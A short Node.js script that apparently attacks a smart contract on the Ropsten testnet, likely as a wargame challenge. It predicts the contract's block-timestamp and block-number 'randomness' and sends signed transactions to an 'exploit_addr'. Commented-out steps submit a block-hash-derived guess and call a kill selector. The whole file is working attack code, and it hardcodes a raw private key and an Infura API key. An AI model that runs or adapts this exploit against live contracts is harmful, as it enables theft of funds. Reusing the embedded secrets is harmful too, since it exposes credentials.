
Web3 = require('web3');
web3 = new Web3(new Web3.providers.HttpProvider("https://ropsten.infura.io/v3/af6a8f666b5146a4a8735a48d6a1ad31"));

const ethTx = require('ethereumjs-tx');



// default price = 5000000000
// default limit = 500000
// default chainId = 3 .i.e ropsten network
function generateTxData({_nonce, _gasPrice='0x12a05f200', _gasLimit='0x7a120', _recipient, _value='0x0',  _data= '0x0', _chainId=3}) {
    var txData = {
        nonce: _nonce,
        gasPrice: _gasPrice,
        gasLimit: _gasLimit,
        to: _recipient,
        value: _value,
        data: _data,
        chainID: _chainId, // Ethereum mainnet chainID
        r: 0,
        s: 0
    };

    return txData;
};



function signTx(_tx_data, _private_key) {
    tx = new ethTx(_tx_data);
    txHash = tx.hash(); // This step encodes into RLP and calculates the hash
    
    tx.sign(_private_key);
    serializedTx = tx.serialize();
    rawTx = '0x' + serializedTx.toString('hex');

    return rawTx;
}


async function doWhale() {
  
    const exploit_addr = '0x5d1e7b702eeb85d863def4cd2b2122fa501b4e87';
    const privKey = Buffer.from('126d3a0efc10b7e8c6902654e26890a6d76e5e9b4d6fe7c131c97768fb5730f2', 'hex');

    //get the lastest block number
    var block_num = await web3.eth.getBlockNumber();
    console.log("!!!!block num: " + block_num);
    

    var timestamp_res = await web3.eth.getBlock(block_num);

    //console.log(timestamp_res);
    console.log("!!!!now: " + timestamp_res['timestamp']);


    const data = web3.utils.padLeft(timestamp_res['timestamp'].toString(16), 64) + 
        web3.utils.padLeft(block_num.toString(16), 64);


    const sig = web3.utils.sha3("isMyFirst(uint256,uint256)").slice(0, 10);
    const count1 = await web3.eth.getTransactionCount('0x003be5Df5FeF651EF0C59cD175c73ca1415f53eA');
    const rawTx1 = signTx(generateTxData({_nonce: count1, 
        _recipient: exploit_addr,
        _data: sig + data} ), privKey);

    var receipt = await web3.eth.sendSignedTransaction(rawTx1);
    console.log("send rawtx1: , receipt: ", rawTx1, receipt);


    var block_num2 = await web3.eth.getBlockNumber();
    console.log("!!!!block num: " + block_num2);



    // var previous_hash_res = await web3.eth.getBlock(block_num);
    // //console.log(previous_hash_res);
    // console.log('!!!!hash: ' + previous_hash_res['hash']);

    // calc_data = previous_hash_res['hash'] + web3.utils.padLeft(timestamp_res['timestamp'].toString(16), 64);
    // console.log("d!!!data: " + calc_data);

    // var sha3_data = web3.utils.sha3(calc_data);
    // console.log(" ------------"+sha3_data.slice(2));


    // // var result = await web3.eth.call({ to: "0x7d619e25b4ab08e2a9ce81d8720887708a2c8839", data: "0xd40a71fb" });
    // // console.log(result);

    // const count1 = await web3.eth.getTransactionCount('0x003be5Df5FeF651EF0C59cD175c73ca1415f53eA');
    // const rawTx1 = signTx(generateTxData({_nonce: count1, 
    //     _recipient: exploit_addr,
    //     _data: "0x8e719922" + sha3_data.slice(2)} ), privKey);
    // var receipt = await web3.eth.sendSignedTransaction(rawTx1);
    // console.log("send rawtx1: , receipt: ", rawTx1, receipt);


    // const count2 = await web3.eth.getTransactionCount('0x003be5Df5FeF651EF0C59cD175c73ca1415f53eA');
    // const rawTx2 = signTx(generateTxData({_nonce: count2, 
    //     _recipient: exploit_addr,
    //     _data: "0x8f4ed333"} ), privKey);
    // receipt = await web3.eth.sendSignedTransaction(rawTx2);
    // console.log("send rawtx2: , receipt: ", rawTx2, receipt);


    // const count3 = await web3.eth.getTransactionCount('0x003be5Df5FeF651EF0C59cD175c73ca1415f53eA');
    // const rawTx3 = signTx(generateTxData({_nonce: count3, 
    //     _recipient: exploit_addr,
    //     _data: "0x41c0e1b5"} ), privKey);
    // receipt = await web3.eth.sendSignedTransaction(rawTx3);
    // console.log("send rawtx3: , receipt: ", rawTx3, receipt);


} 

doWhale();